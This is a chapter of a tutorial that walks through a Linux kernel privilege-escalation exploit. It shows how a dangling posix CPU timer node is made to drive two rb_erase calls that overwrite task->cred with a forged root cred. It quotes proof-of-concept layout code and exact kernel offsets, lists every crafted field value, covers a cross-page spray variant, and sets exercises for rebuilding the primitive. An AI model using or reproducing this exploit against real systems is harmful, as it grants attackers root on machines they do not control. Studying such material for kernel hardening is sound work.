# Chapter 11 — Two erases: `rb_erase` writes `task->cred`

Goal of this chapter: this is the heart of the exploit. After it you should be
able to explain, field by field, how two consecutive calls to the kernel's
`rb_erase` are steered into three writes that hand the worker a fake `cred`
structure. There is no new kernel theory here — it is chapter 4 applied with
attacker-chosen pointer values, made possible by chapters 9–10.

References: `__rb_erase_augmented` (include/linux/rbtree_augmented.h:244–344,
especially 270–276), `timerqueue_del` (lib/timerqueue.c:52–61), PoC
`prepare_stage2()` (605–714) and `stage2_go` handling in `oracle_worker_main`
(323–345).

## 1. The target writes

From chapter 10 we hold, for the winning worker:

- `task` — its `task_struct`, hence
  - `S = task + 0xd00` (`&task->cred`, the pointer the kernel uses for all
    privilege checks), and
  - `H = task + 0xca0` (its SCHED `tqhead`, the *live* tree that still holds
    our dangling node);
- `kernel_object` and `alias_delta` — so we can name kernel addresses of any
  byte in our page.

The plan is to abuse the two `timerqueue_del()` calls that will happen when the
worker's queue is next collected (chapter 10 §3 explains when: the node
survives in the queue; chapter 12 wires the trigger). We want from those two
`rb_erase` calls:

| # | write | meaning |
|---|---|---|
| 1 | `*(uint64_t *)S = C` | `task->cred = C` (fake cred) |
| 2 | `*(uint64_t *)(C + 8) = 0` | fake cred's `uid`/`gid` = 0 |
| 3 | `*(uint64_t *)H->rb_root = C + 8` | cleanup/harmless: the dead tree's root |

Writes 1 and 2 are the privilege escalation. Write 3 is what the erase *must*
do to some pointer; we choose it to be harmless.

## 2. The branch we will take

`rb_erase()`'s interesting case for us is
`include/linux/rbtree_augmented.h:270`:

```c
	} else if (!child) {
		/* Still case 1, but this time the child is node->rb_left */
		tmp->__rb_parent_color = pc = node->__rb_parent_color;
		parent = __rb_parent(pc);
		__rb_change_child(node, tmp, parent, root);
		rebalance = NULL;
		tmp = parent;
	}
```

This runs when the node being erased has **no right child** (`child == NULL`)
but **has a left child** (`tmp = node->rb_left != NULL`). Its stores, in order:

1. `tmp->__rb_parent_color = pc = node->__rb_parent_color;`
   → writes the node's `parent_color` word **into `tmp`**.
2. `parent = __rb_parent(pc)` → `pc & ~3` (mask off color bits).
3. `__rb_change_child(node, tmp, parent, root)`
   (rbtree_augmented.h:216):

   ```c
	if (parent) {
		if (parent->rb_left == old)
			WRITE_ONCE(parent->rb_left, new);
		else
			WRITE_ONCE(parent->rb_right, new);
	} else
		WRITE_ONCE(root->rb_node, new);
   ```

   One more store: either into `parent` (chosen by a comparison), or into the
   tree root if `parent == NULL`.

`rebalance = NULL` also means `__rb_erase_color()` (the color-rebalancing
walk) is **skipped entirely** — no further reads of the tree. And because the
worker is collecting its *own* queue, `root` is always the word at
`H->rb_root.rb_node` inside `task_struct` — writable kernel memory.

So one erase gives us two controlled stores if we control: the node's
`parent_color`, its `rb_left`, and the two pointers stored at the "parent".

Two such erases, with different fabricated nodes, give exactly the three
writes above.

## 3. The stage-2 page layout

All the fake structures live in the same physical page as the dangling object,
so kernel addresses are `user_address + alias_delta`. `prepare_stage2()` lays
them out (626–665):

```c
	layout = cross_page ? 0x400 : (object_offset >= 0x600 ? 0x100 : 0x900);
	fake_cred = page + layout;
	fake_timer = page + layout + 0x100;
	fake_userns = page + layout + 0x300;
	security = page + layout + 0x380;
	label = page + layout + 0x3c0;
```

`object_offset` is where the real (dangling) object sits in the page; the
choice puts `fake_cred` at a fixed offset that does not overlap it (checked at
635–638), with the accompanying fake `struct cred` scenery (`fake_userns`,
`security`, `label`) trailing behind. Then every pointer is converted to a
kernel address (640–645), e.g.:

```c
	fake_cred_addr = (uint64_t)(uintptr_t)fake_cred + alias_delta;
	fake_timer_node_addr = ... (fake_timer + 0xe0) + alias_delta;
```

### 3.1 Node `A` — the dangling object itself (`user_object`, 699–710)

| field (offset) | value | role |
|---|---|---|
| `+0x30` | `1` | validity word: `posixtimer_valid()` false → no signal queued later |
| `+0x40` | `0` | `it_lock` unlocked (handler may proceed) |
| `+0x68` | `1` | guard word |
| `+0xe0` | `C` | `node.__rb_parent_color` → "parent" is the fake cred |
| `+0xe8` | `0` | `node.rb_right` = NULL → take the branch of §2 |
| `+0xf0` | `S` | `node.rb_left` → becomes `tmp`; `S = &task->cred` |
| `+0xf8` | `0` | `node.expires` = 0 → due immediately |
| `+0x100` | `H` | `it.cpu.head` → **non-NULL**, so the dequeue *will* run this time |
| `+0x120…0x128` | `0` | `firing`, padding, `handling` cleared |

(Compare with stage 1, where every one of these was the "safe" value: `head=0`
to *keep* the node, `expires=1` to be collected, `it_lock=1` to stall the
handler.)

### 3.2 `C` — the fake `cred`, also an RB node (653–665)

`C` is a `struct cred` the kernel will believe, and *simultaneously* the
"parent" node of `A`. Its first three words are interpreted as an RB node by
the erase; the rest are `cred` fields:

| offset | as RB node | as `cred` | value |
|---|---|---|---|
| `+0x00` | `parent_color` | `usage` | `M_node` (a big pointer = huge refcount) |
| `+0x08` | `rb_right` | `uid` (4B) + `gid` (4B) | `A_node` → later zeroed by erase 2 |
| `+0x10` | `rb_left` | `suid`/`sgid` | `0` |
| `+0x18…0x28` | — | `euid`, `egid`, `fsuid`, `fsgid`, `securebits` | `0` (memset) |
| `+0x30…0x50` | — | the five capability sets | all `UINT64_MAX` |
| `+0x80` | — | `security` (LSM blob) | → `security` |
| `+0x90` | — | `user_ns` | → `fake_userns` |

`uid`/`gid`/`suid`/`sgid`/`euid`/`egid`/`fsuid`/`fsgid` are all eventually
zero: the ones not touched by erase 2 come from the `memset` at 653.

The fake LSM scenery (667–674): `security+0x10 = label`; `label+0x00 = 0x100`
(a refcount), `label+0x40 = 2` (`FLAG_UNCONFINED` for AppArmor); `fake_userns`
gets four counters set to `1`. These keep the post-escalation paths (file
access, permission checks) from tripping over obvious garbage.

### 3.3 `M` — a second fake timer, and the next node (654, 676–683)

`M` is a fully valid-looking `k_itimer`-shaped object we *want* the collector
to pick up right after `A`:

| offset | field | value | role |
|---|---|---|---|
| `+0x30` | validity | `1` | no signal delivery |
| `+0x40` | `it_lock` | `0` | handler can take it |
| `+0x68` | guard | `1` | |
| `+0xe0` | `node.parent_color` | `0` | `pc = 0` → `parent = NULL`, and the word written into `tmp` is `0` |
| `+0xe8` | `node.rb_right` | `0` | branch of §2 |
| `+0xf0` | `node.rb_left` | `C + 8` | `tmp` — where the `0` gets written |
| `+0xf8` | `node.expires` | `0` | due immediately |
| `+0x100` | `it.cpu.head` | `H` | dequeue runs |

Why `C+8`? Because `C+8` is the fake cred's `uid`/`gid` word, and this is the
only store in erase 2 that lands at a *chosen* address (`tmp` is chosen by us).
`M` is at `page+layout+0x100`, and the collector reaches it because of how
`rb_next(A)` climbs the fabricated parents (§4).

### 3.4 The fence

The layout writes finish with a release fence and then a final, separate store
of `node.expires = 0` (696/709–710):

```c
	atomic_thread_fence(memory_order_release);
	*(uint64_t *)(user_object + 0xf8) = 0;
```

`expires` is what the collector uses to decide "collect or stop". Publishing
"due" *after* every other field, with a release fence in between, guarantees
that when the worker (on some CPU) reads `expires = 0` it cannot observe the
other fields half-written.

## 4. The two erases, step by step

When `stage2_go` is set, `oracle_worker_main` runs `warm_splice_pipe()` and
then burns CPU in a loop calling `do_escalate()` (327–341). Burning CPU is the
trigger: after `nextevt` (which stage 1 left at `sample + 250 ms`) is passed,
the worker's tick path calls `run_posix_cpu_timers()` →
`collect_timerqueue()`. `timerqueue_getnext()` returns `A` (still the
leftmost), `expires = 0` → due. Then:

```c
		ctmr->firing = true;                      /* A + 0x120 = 1   */
		rcu_assign_pointer(ctmr->handling, current);
		cpu_timer_dequeue(ctmr);
		list_add_tail(&ctmr->elist, firing);
```

and this time `cpu_timer_dequeue` (posix-timers.h:81) sees `head = H ≠ NULL`,
so it calls `timerqueue_del(H, &A.node)`:

```
timerqueue_del:  WARN_ON_ONCE(RB_EMPTY_NODE(&node->node))   /* A.parent_color == C ≠ A: ok */
                 rb_erase_cached(&A.node, &H->rb_root)
```

`rb_erase_cached` first fixes the cached leftmost: `A` is leftmost, so
`leftmost = rb_next(A)`. Reading `rb_next` (this is the usual "climb up"
algorithm):

```
rb_next(A):  A.rb_right == 0
             parent = rb_parent(A.parent_color = C)  = C
             A == C->rb_right ?   C->rb_right == A_node (we wrote it) -> yes
             node = C; parent = rb_parent(C.parent_color = M_node) = M
             C == M->rb_right ?   M->rb_right == 0 -> no
             return M
```

So `leftmost = M`. Then `rb_erase(A, root)` takes the §2 branch with
`tmp = A.rb_left = S`:

| store | target | value | effect |
|---|---|---|---|
| `tmp->__rb_parent_color = pc` | `*(uint64_t *)S` | `C` | **`task->cred = C`** |
| `parent = __rb_parent(pc)` | — | `C` | |
| `__rb_change_child(A, S, C, root)` | `*(uint64_t *)(C+8)` | `S` | C's RB `rb_right` (the eventual `uid`/`gid` word) — temporary |
| `RB_CLEAR_NODE(&A.node)` (back in `timerqueue_del`) | `A + 0xe0` | `&A.node` | "I am unlinked" marker, in our page |

No other memory is touched: `rebalance = NULL`, the color-rebalancing code is
skipped, and the tree-root store was skipped because `parent = C` is non-NULL
(`__rb_change_child` took the `parent->rb_right` path because
`C.rb_left == 0 ≠ A`).

Then back in `collect_timerqueue()`: the loop asks for the next node,
`timerqueue_getnext()` returns `H->rb_root.rb_leftmost = M`. `M.expires = 0`,
so it is due too:

```
		ctmr->firing = true;                 /* M + 0x120 = 1 */
		... handling = current ...
		cpu_timer_dequeue(ctmr);             /* M.head = H -> runs */
		list_add_tail(&ctmr->elist, firing);
```

`timerqueue_del(H, &M.node)`:

```
rb_erase_cached: leftmost == M -> leftmost = rb_next(M):
                 M.rb_right == 0; parent = rb_parent(M.parent_color = 0) = NULL
                 -> rb_next returns NULL; leftmost = NULL
rb_erase(M):     tmp = M.rb_left = C+8
                 tmp->__rb_parent_color = pc = M.parent_color = 0
                 parent = __rb_parent(pc = 0) = NULL
                 __rb_change_child(M, tmp = C+8, NULL, root)
                     -> parent == NULL -> root->rb_node = C+8
                 rebalance = NULL
RB_CLEAR_NODE(M) -> M.parent_color = &M.node
```

which is:

| store | target | value | effect |
|---|---|---|---|
| `tmp->__rb_parent_color = pc` | `*(uint64_t *)(C+8)` | `0` | **fake cred `uid` = `gid` = `0`** |
| `__rb_change_child(..., NULL, root)` | `H->rb_root.rb_node` (`task+0xca0`) | `C+8` | the task's queue root now points at our fake cred |
| `RB_CLEAR_NODE(M)` | `M + 0xe0` | `&M.node` | marker in our page |

Back in the collect loop a third time: `timerqueue_getnext()` returns
`leftmost = NULL` → loop ends → `collect_timerqueue()` returns `U64_MAX` →
`base->nextevt = U64_MAX` (posix-cpu-timers.c:897). **The timer machinery will
not touch the (now inconsistent) tree again** until someone rearms a timer on
that base — and nobody will.

## 5. The handler pass

The two collected entries are then processed by `handle_posix_cpu_timers()`
(1432–1456), in order `A` then `M`:

```c
		spin_lock(&timer->it_lock);          /* our words: 0 -> uncontended */
		list_del_init(&timer->it.cpu.elist); /* self-pointers, in our page */
		cpu_firing = timer->it.cpu.firing;   /* true (collect set it) */
		timer->it.cpu.firing = false;
		if (likely(cpu_firing))
			cpu_timer_fire(timer);
		rcu_assign_pointer(timer->it.cpu.handling, NULL);
		spin_unlock(&timer->it_lock);
```

`cpu_timer_fire()` (posix-cpu-timers.c:677) ends in
`posix_timer_queue_signal()`, which begins (posix-timers.c:361):

```c
	if (!posixtimer_valid(timr))
		return;
```

`posixtimer_valid()` is `!(it_signal & 1)`; our validity word is `1`, so
**nothing is queued** and the pass ends without touching any further kernel
object. (Without that guard the kernel would build a signal from our garbage
`sigqueue`/`ucounts` fields — which is why the guard exists in every fake
timer we plant.)

After the handler, the worker is back in its userspace loop. Its `task_struct`
now contains `cred = C` where `C` is a fully populated fake cred with all
uids 0 — but its `real_cred` is untouched (that field is at a different,
never-written offset). Chapter 12 uses exactly that difference.

## 6. Reading the field choices as a defensive design

Every crafted value has a reason; if you can reproduce this table from memory,
you understand the primitive:

| crafted value | prevents |
|---|---|
| `head = H` | the dequeue being skipped again (we *need* the `rb_erase`) |
| `expires = 0` | the collector stopping before the node |
| `A.rb_right = 0` | taking the "node has two children" branch (which would use `rb_next`-based successor swaps on unverified memory) |
| `A.rb_left = S`, `A.parent_color = C` | the two stores landing anywhere but `S` and `C+8` |
| `C.rb_right = A_node` + `C.parent_color = M_node` | `rb_next(A)` returning anything but `M` (next node must be ours) |
| `M.rb_left = C+8`, `M.parent_color = 0` | erase 2's store anywhere but `uid`/`gid`, and the final root store anywhere but the dead queue |
| validity words `= 1` | signal delivery from the handler pass |
| `it_lock = 0` | stalling in the handler forever |
| `rebalance = NULL` paths | any color-rebalancing walk over uncontrolled memory |

## 7. Cross-page variant

When the object straddles a page boundary, the same values are stamped into
all sprayed pages at tail offsets instead of directly (685–697):

```c
	if (cross_page) {
		broadcast_u64(spray, 0xf30, 1);            /* A+0x30 */
		broadcast_u32(spray, 0xf40, 0);            /* A+0x40 */
		broadcast_u64(spray, 0xf68, 1);            /* A+0x68 */
		broadcast_u64(spray, 0xfe0, fake_cred_addr); /* A+0xe0 */
		broadcast_u64(spray, 0xfe8, 0);            /* A+0xe8 */
		broadcast_u64(spray, 0xff0, cred_slot);    /* A+0xf0 */
		*(uint64_t *)(marker_page + 0x00) = head;  /* A+0x100 */
		... firing/handling zeroed at marker_page+0x20/+0x28 ...
		broadcast_u64(spray, 0xff8, 0);            /* A+0xf8, last */
	}
```

The offsets are just `object+field = marker_page + field - 0x100`. The logic
is untouched.

## Hands-on

1. Copy `__rb_erase_augmented()` from
   `include/linux/rbtree_augmented.h:244` into a small userspace C file with
   `struct rb_node { uint64_t __rb_parent_color; struct rb_node *rb_right,
   *rb_left; }` and a `rb_next()` of your own. Set up `A`, `C`, `M` exactly as
   in §4 (use small fake addresses like `0x1000`, `0x2000`, `0x3000`), print
   every pointer before the two `rb_erase` calls, then after. Verify: after
   erase 1, `tmp(C)`'s word equals the address you put in `A.parent_color`,
   and `C->rb_right` equals `S`. After erase 2, `uid/gid` (`C+8`) is `0` and
   the root points at `C+8`. This is the chapter's exercise: the exploit in 40
   lines of userspace.
2. In the same program, try variants and *watch them break*:
   - set `A.rb_right = M` (two children): trace which branch runs and which
     memory is read; explain why the PoC avoids it.
   - set `M.parent_color = X` with `X & ~3 ≠ 0`: where does erase 2's second
     store land, and which word of the fake cred is corrupted?
   - set `C.rb_left = A`: which word of the fake cred receives `S`, and why is
     that harmless (or not) for the final `uid`/`gid` values?
3. Re-read `prepare_stage2` (605–714) top to bottom and annotate each store
   with "who reads it later" (collect / erase / handler / post-escalation
   privilege checks).
4. Answer: why is **no** field of `real_cred` reachable by this trick? (Look
   at where `S` points and where erase 1's store lands.)
5. Extra: `collect_timerqueue()`'s loop limit is `MAX_COLLECTED = 20`. Where
   does its value end up after the last iteration, and which line of the
   worker's subsequent execution would have to check it for a third collection
   to be possible?

## Checkpoint

1. Which RB-tree branch does the exploit take, and what does it require about
   the erased node?
2. Give the three writes produced by the two `rb_erase` calls, with exact
   target addresses (`S`, `C+8`, `H`).
3. Why does `rb_next(A)` return `M`, and what would happen if it returned
   `NULL` instead? (Which write would you lose?)
4. Why is `head = H` essential in stage 2 while `head = 0` was essential in
   stage 1?
5. What stops the collector from touching the corrupted tree some third time?
